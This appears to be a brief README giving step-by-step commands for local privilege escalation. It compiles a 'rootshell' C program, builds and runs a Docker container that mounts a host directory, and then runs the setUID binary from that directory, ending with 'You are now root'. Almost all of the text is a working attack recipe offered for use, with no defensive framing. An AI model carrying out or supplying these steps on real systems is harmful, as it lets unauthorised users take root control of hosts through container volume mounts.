## How to escalate privilege using setUID : 

Compile c program : 
```
gcc -o rootshell rootshell.c
```

Build the docker images : 
```
docker build -t setuid_hack .
```

Run container : 

```
docker run -v /tmp/persist:/persist setuid_hack:latest /bin/sh root.sh
```

Privilege escalation : 

1. Run `id` command . 
2. execute /tmp/persist/rootshell . 
3. Re-run id command . (You are now root)
